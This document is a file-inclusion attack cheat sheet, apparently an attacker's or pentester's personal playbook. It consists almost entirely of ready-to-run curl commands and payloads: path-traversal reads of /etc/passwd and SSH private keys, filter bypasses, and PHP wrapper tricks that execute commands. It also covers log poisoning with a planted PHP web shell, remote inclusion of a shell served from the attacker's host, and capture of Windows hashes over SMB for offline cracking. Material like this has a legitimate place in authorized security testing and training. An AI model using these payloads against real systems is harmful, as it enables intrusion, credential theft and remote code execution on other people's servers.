# File inclusion

## Confirm
A parameter that names a page, file, language or template:
curl -sk "<Scheme>://<WebHost>/THE-PAGE?<Param>=../../../../../../etc/passwd"
curl -sk "<Scheme>://<WebHost>/THE-PAGE?<Param>=../../../../../../windows/win.ini"
A name that does not exist, for an error that shows the code around it:
curl -sk "<Scheme>://<WebHost>/THE-PAGE?<Param>=nothing8f3k"
- [ ] include(THE-PREFIX/nothing8f3k.php) in the error: a folder in front and .php after, which decide the bypass
- [ ] Logged in: -b 'THE-COOKIE' on every curl and ffuf below

## Past the filter
As the value of <Param>, when the plain traversal fails:
/etc/passwd
....//....//....//....//....//....//etc/passwd
..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
../../../../../../etc/passwd%00
THE-PREFIX/../../../../../../etc/passwd
ffuf -c -u '<Scheme>://<WebHost>/THE-PAGE?<Param>=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mr 'root:x:0:0'
- [ ] %00 works only on PHP older than 5.3.4

## Files worth reading
- [ ] /etc/passwd: the users with a shell, then /home/<Username>/.ssh/id_rsa for each one
- [ ] The app's config in the web root: config.php, wp-config.php, .env, settings.py
- [ ] /etc/apache2/sites-enabled/000-default.conf and /etc/nginx/sites-enabled/default: the web root and other virtual hosts
- [ ] /proc/self/cmdline and /proc/self/environ: what runs the app, and as whom
- [ ] Windows: C:\inetpub\wwwroot\web.config, C:\xampp\apache\conf\httpd.conf, C:\Windows\System32\drivers\etc\hosts

## PHP source
A .php file runs instead of showing, so read it as base64:
curl -sk "<Scheme>://<WebHost>/THE-PAGE?<Param>=php://filter/convert.base64-encode/resource=<File>"
echo 'THE-BASE64' | base64 -d
- [ ] The app adds .php itself: <File> without its .php

## Code through a wrapper
data:// and php://input need allow_url_include on, and expect:// a rare extension:
curl -sk "<Scheme>://<WebHost>/THE-PAGE?<Param>=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2B&cmd=id"
curl -sk -X POST --data "<?php system('id'); ?>" "<Scheme>://<WebHost>/THE-PAGE?<Param>=php://input"
curl -sk "<Scheme>://<WebHost>/THE-PAGE?<Param>=expect://id"
A filter chain needs no setting at all: it builds the PHP out of php://filter conversions.
wget https://raw.githubusercontent.com/synacktiv/php_filter_chain_generator/main/php_filter_chain_generator.py
python3 php_filter_chain_generator.py --chain '<?=`$_GET[0]`?>'
curl -sk "<Scheme>://<WebHost>/THE-PAGE?<Param>=THE-CHAIN&0=id"
- [ ] The URL refused as too long: the chain sent by POST, if the app reads $_REQUEST

## Log poisoning
- [ ] One broken payload spoils the log until it rotates: single quotes inside, and sent once
curl -sk "<Scheme>://<WebHost>/THE-PAGE?<Param>=../../../../../../var/log/apache2/access.log"
curl -sk <Scheme>://<WebHost>/ -A "<?php system(\$_GET['cmd']); ?>"
curl -sk "<Scheme>://<WebHost>/THE-PAGE?<Param>=../../../../../../var/log/apache2/access.log&cmd=id"
- [ ] Other access logs: /var/log/httpd/access_log, /var/log/nginx/access.log, C:\xampp\apache\logs\access.log
The SSH log, readable only on a careless host, with the payload as the username:
python3 -c "import paramiko; c=paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy()); c.connect('<TargetIP>', username='<?php system(\$_GET[\"cmd\"]); ?>', password='x')"
curl -sk "<Scheme>://<WebHost>/THE-PAGE?<Param>=../../../../../../var/log/auth.log&cmd=id"
- [ ] FTP: the payload as the login name, then /var/log/vsftpd.log
- [ ] A value the app keeps in my session set to the payload, then /var/lib/php/sessions/sess_THE-SESSION-ID
Blind, with sudo tcpdump -i tun0 icmp running on Kali:
curl -sk "<Scheme>://<WebHost>/THE-PAGE?<Param>=../../../../../../var/log/apache2/access.log&cmd=ping+-c+2+<LHOST>"
- [ ] Commands run: a reverse shell through cmd, URL-encoded once, from :Pb shells

## Remote inclusion
On Kali, in an empty folder:
echo '<?php system($_GET["cmd"]); ?>' > shell.txt
python3 -m http.server 80
curl -sk "<Scheme>://<WebHost>/THE-PAGE?<Param>=http://<LHOST>/shell.txt&cmd=id"
- [ ] A GET /shell.txt in the server's log proves it, even with nothing on the page
- [ ] The app adds .php: the URL ended with %3F, so the .php becomes a query string
At the pwn-broker prompt: tool install impacket.
Windows reaches an SMB share the same way, and sends its hash with it:
sudo /opt/pwn-broker/bin/impacket-smbserver share "$(pwd)" -smb2support
- [ ] The full path with sudo: a bare sudo impacket-smbserver does not use pwn-broker's bin folder
curl -sk "<Scheme>://<WebHost>/THE-PAGE?<Param>=\\\\<LHOST>\\share\\shell.txt&cmd=whoami"
Only the hash, with the same non-poisoning SMB listener:
curl -sk "<Scheme>://<WebHost>/THE-PAGE?<Param>=\\\\<LHOST>\\nothing"
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
